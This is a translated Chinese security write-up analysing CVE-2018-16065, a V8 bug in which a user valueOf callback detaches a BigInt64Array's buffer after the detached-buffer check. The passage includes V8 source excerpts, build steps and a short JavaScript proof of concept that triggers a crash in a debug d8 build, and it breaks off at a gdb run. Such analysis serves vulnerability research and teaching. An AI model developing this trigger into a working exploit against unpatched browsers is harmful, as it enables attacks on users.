# CVE-2018-16065 in V8 EmitBigTypedArrayElementStore 分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 一、前言
CVE-2018-16065 是 v8 中 `EmitBigTypedArrayElementStore` 函数内部的一个漏洞。该漏洞在检查相应
ArrayBuffer 是否被 Detach（即是否是`neutered`）之后，执行了一个带有 **副作用** 的（即 **可调用用户 JS
callback 代码** 的） `ToBigInt` 函数。而用户可在对应回调函数中将原先通过上述检查的 BigIntArray （即 **不是
neutered 的 TypedArray** ）重新变成 `neutered`。
这将使一部分数据被非法写入至一块已经 Detached 的 ArrayBuffer上。如果 GC 试图回收该 ArrayBuffer 的 backing
store ，则会触发 CRASH。
## 二、环境搭建
切换 v8 版本，然后编译：
    git checkout 6.8.275.24
    gclient sync
    tools/dev/gm.py x64.debug
## 三、漏洞细节
在执行 JS 代码 `BigInt64Array.of` 函数时，v8 将调用以下 `Builtin_TypedArrayOf`函数：
    // ES6 #sec-%typedarray%.of
    TF_BUILTIN(TypedArrayOf, TypedArrayBuiltinsAssembler) {
      TNode context = CAST(Parameter(BuiltinDescriptor::kContext));
      [...]
      DispatchTypedArrayByElementsKind(
          elements_kind,
          [&](ElementsKind kind, int size, int typed_array_fun_index) {
            TNode elements =
                CAST(LoadElements(new_typed_array));
            BuildFastLoop(
                IntPtrConstant(0), length,
                [&](Node* index) {
                  TNode item = args.AtIndex(index, INTPTR_PARAMETERS);
                  TNode intptr_index = UncheckedCast(index);
                  // 如果当前的 TypeArray 是 BigIntArray
                  if (kind == BIGINT64_ELEMENTS || kind == BIGUINT64_ELEMENTS) {
                    // 则剩余操作在 EmitBigTypedArrayElementStore 函数内部完成
                    EmitBigTypedArrayElementStore(new_typed_array, elements,
                                                  intptr_index, item, context,
                                                  &if_neutered);
                  } else {
                    [...]
                  },
                1, ParameterMode::INTPTR_PARAMETERS, IndexAdvanceMode::kPost);
          });
      [...]
    }
对于 BigIntArray 这类 TypedArray，v8 将在该函数中继续调用 `EmitBigTypedArrayElementStore`
函数，并在其中完成剩余的操作。
`EmitBigTypedArrayElementStore` 函数较为简单，先看看源码：
    void CodeStubAssembler::EmitBigTypedArrayElementStore(
        TNode object, TNode elements,
        TNode intptr_key, TNode value, TNode context,
        Label* opt_if_neutered) {
      if (opt_if_neutered != nullptr) {
        // Check if buffer has been neutered.
        Node* buffer = LoadObjectField(object, JSArrayBufferView::kBufferOffset);
        GotoIf(IsDetachedBuffer(buffer), opt_if_neutered);
      }
      // 获取 BigInt，其中 ToBigInt 函数会调用 JS 中的 [Object.valueOf] 函数
      TNode bigint_value = ToBigInt(context, value);
      TNode backing_store = LoadFixedTypedArrayBackingStore(elements);
      TNode offset = ElementOffsetFromIndex(intptr_key, BIGINT64_ELEMENTS,
                                                     INTPTR_PARAMETERS, 0);
      EmitBigTypedArrayElementStore(elements, backing_store, offset, bigint_value);
    }
我们可以很容易的发现，如果 BigIntArray 的 ArrayBuffer 是 neutered 的，那么就直接跳到指定的 Label
处进行异常处理，不会再继续向下执行，也就是说 **不会再将 elements 写入至 backing_store** 。
但 `ToBigInt` 函数有点特殊，它将调用 Object.valueOf 属性的函数来获取值，而 **这个函数是可以被用户定义的**
。如果我们在该函数中，将当前 BigIntArray 的 ArrayBuffer 设置为 neutered
，那么下面执行写入操作时，数据写入的位置将是刚刚被 detach 的 ArrayBuffer 中。这是一步非法操作，如果 GC 试图回收该
ArrayBuffer 的 backing store ，那么这将使 GC 触发崩溃。
这里需要说明一下 `neutered` 的含义。即什么样的 ArrayBuffer 将会被视为 neutered 的？如何设置某个 Array 为
neutered ？
通过查阅 [v8
docs](https://v8docs.nodesource.com/node-10.15/d5/d6e/classv8_1_1_array_buffer.html#ab73b5545800351ec54c4c0ac002f9d81)
，我们可以简单了解到，Neuter 这个操作，会将 Buffer 和所有 typed Array 的长度设置为0，从而防止JavaScript访问底层
backing_store。
我们再来看一下 v8 中的一个 Runtime 函数：`ArrayBufferNeuter`:
    RUNTIME_FUNCTION(Runtime_ArrayBufferNeuter) {
      HandleScope scope(isolate);
      DCHECK_EQ(1, args.length());
      Handle argument = args.at(0);
      // This runtime function is exposed in ClusterFuzz and as such has to
      // support arbitrary arguments.
      // 该函数只对 ArrayBuffer 类型的参数效果，若传入其他类型则引出异常
      if (!argument->IsJSArrayBuffer()) {
        THROW_NEW_ERROR_RETURN_FAILURE(
            isolate, NewTypeError(MessageTemplate::kNotTypedArray));
      }
      Handle array_buffer = Handle::cast(argument);
      // 如果当前 ArrayBuffer 不可被设置为 neuter,则不用继续执行下去，直接返回
      if (!array_buffer->is_neuterable()) {
        return isolate->heap()->undefined_value();
      }
      // 如果该 ArrayBuffer 的 backing_store 为空，检查 arraybuffer 的 length 是否为0。这一步是检查当前 ArrayBuffer 是否已经是 neutered 的。
      if (array_buffer->backing_store() == nullptr) {
        CHECK_EQ(Smi::kZero, array_buffer->byte_length());
        return isolate->heap()->undefined_value();
      }
      // Shared array buffers should never be neutered.
      CHECK(!array_buffer->is_shared());
      DCHECK(!array_buffer->is_external());
      // 准备开始 neuter 了，先获取 backing_store 指针和当前 ArrayBuffer 的长度
      void* backing_store = array_buffer->backing_store();
      size_t byte_length = NumberToSize(array_buffer->byte_length());
      array_buffer->set_is_external(true);
      // 将当前 ArrayBuffer 从ArrayBufferTracker中移除
      isolate->heap()->UnregisterArrayBuffer(*array_buffer);
      // 开始执行 neuter 操作
      array_buffer->Neuter();
      // 将backing_store占用的内存空间释放
      isolate->array_buffer_allocator()->Free(backing_store, byte_length);
      return isolate->heap()->undefined_value();
    }
    void JSArrayBuffer::Neuter() {
      CHECK(is_neuterable());
      CHECK(!was_neutered());
      CHECK(is_external());
      // 将当前 backing store 移除
      set_backing_store(nullptr);
      // 设置当前 length 为 0
      set_byte_length(Smi::kZero);
      set_was_neutered(true);
      set_is_neuterable(false);
      // Invalidate the neutering protector.
      Isolate* const isolate = GetIsolate();
      if (isolate->IsArrayBufferNeuteringIntact()) {
        isolate->InvalidateArrayBufferNeuteringProtector();
      }
    }
简单读一下源码，我们也可以很容易的发现， **ArrayBuffer 的 neuter 操作 就是删除 ArrayBuffer 中的 backing
store 并重置其 length 字段。**
综上所述，neuter 的具体操作已经非常明确了，如果不明确的话还可以使用 `%DebugPrint` 比较一下 neuter 前后的差异。
接下来我们看看 Poc。
## 四、PoC
POC 如下：
    // flags: --allow-natives-syntax --expose-gc
    var array = new BigInt64Array(11);
    // constructor 返回数组
    function constructor() { return array };
    function evil_callback() {
      print("callback");
      %ArrayBufferNeuter(array.buffer);
      gc();
      return 0xdeadbeefn;
    }
    var evil_object = {valueOf: evil_callback}
    var root = BigInt64Array.of.call(
      constructor,
      evil_object
    )
    gc(); // trigger
分析上面的 POC，可以理出一条这样的漏洞触发过程：
  * 首先执行 BigInt64Array.of.call ，其中 多调用了一个 call 是为了使 constructor 函数和 设置的 element 都可以操作同一个 array。
  * 初始时， array 的 backing_store 存在，因此将绕过 v8 `EmitBigTypedArrayElementStore` 函数中的 ArrayBuffer **neutered** 检查，进入 **ToBigInt** 函数。
  * ToBigInt 函数将会获取传入 element 的值，因此便会调用 evil_object.valueOf 函数，即调用 evil_callback JS 函数。
  * 该函数将执行 v8 Runtime 函数 `%ArrayBufferNeuter`，释放 array 中 ArrayBuffer 的 backing_store。
  * 完成以上操作后，v8 `EmitBigTypedArrayElementStore` 函数中的 ToBigInt 函数将返回，此时继续执行，试图将 element 写入之前保存的 backing_store 里。
  * 由于该 ArrayBuffer 已经被 detached，因此这样的写入将修改该 backing_store 上的一些用于 GC 的元数据，使最后在执行 GC 时触发崩溃。
> **将值写入至 Detached ArrayBuffer** 时，因为其 heap chunk 仍然是 **allocated** 的，因此不存在
> UaF。
gdb 可能的两种崩溃输出如下：
第一种
    pwndbg> r
    Starting program: /usr/class/v8/v8/out/x64.debug/d8 --allow-natives-syntax --expose-gc test.js